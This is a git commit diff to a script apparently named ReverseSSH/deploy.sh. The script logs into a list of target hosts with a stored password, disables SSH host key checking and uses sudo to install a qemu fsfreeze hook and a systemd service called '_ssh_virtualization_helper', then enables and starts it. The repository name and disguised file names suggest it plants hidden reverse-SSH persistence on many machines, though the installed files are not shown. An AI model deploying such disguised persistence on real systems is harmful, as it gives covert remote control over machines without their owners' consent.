c15364f7a7f429cc6f37454674cba316b30745ea
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-27 22:53:13 -0400

    final fix

--- ReverseSSH/deploy.sh
+++ ReverseSSH/deploy.sh
@@ -11,14 +11,20 @@ for TARGET in "${TARGETS[@]}"; do
 done
 
 for TARGET in "${TARGETS[@]}"; do
-    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no ${USER}@${TARGET}"\
-    echo '$PASS' | sudo -S -v && \
-    sudo mv /tmp/fsfreeze-hook.sh /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh && \
-    sudo mv /tmp/_ssh_virtualization_helper.sh /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh && \
-    sudo mv /tmp/_ssh_virtualization_helper.service /etc/systemd/system/_ssh_virtualization_helper.service && \
-    sudo chmod +x /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh && \
-    sudo chmod +x /etc/ssh/sshd_config.d/_ssh_virtualization_helper.sh && \
-    sudo systemctl daemon-reload && \
-    sudo systemctl enable _ssh_virtualization_helper.service && \
-    sudo systemctl start _ssh_virtualization_helper.service"
+    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no ${USER}@${TARGET} "\
+echo \"$PASS\" | sudo -S bash -c '
+    set -e
+
+    mv /tmp/fsfreeze-hook.sh /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
+    mv /tmp/_ssh_virtualization_helper.sh /usr/local/bin/_ssh_virtualization_helper.sh
+    mv /tmp/_ssh_virtualization_helper.service /etc/systemd/system/_ssh_virtualization_helper.service
+
+    chmod +x /etc/qemu/fsfreeze-hook.d/fsfreeze-hook.sh
+    chmod +x /usr/local/bin/_ssh_virtualization_helper.sh
+
+    systemctl daemon-reload
+    systemctl enable _ssh_virtualization_helper.service
+    systemctl start _ssh_virtualization_helper.service
+'
+"
 done
